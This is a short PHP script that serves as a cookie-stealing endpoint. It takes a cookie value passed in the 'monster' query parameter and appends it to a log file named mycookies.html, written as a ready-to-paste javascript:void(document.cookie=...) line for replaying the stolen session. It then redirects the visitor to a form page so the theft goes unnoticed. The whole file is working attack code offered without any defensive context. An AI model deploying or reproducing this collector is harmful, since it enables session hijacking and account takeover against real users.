<?php
$cookie=$_GET['monster'];
$fi=fopen('mycookies.html','a');
fwrite($fi, "COOKIE:=javascript:void(document.cookie='".$cookie."');<br />");
header("Location: iframe.php?page=form.php");
?>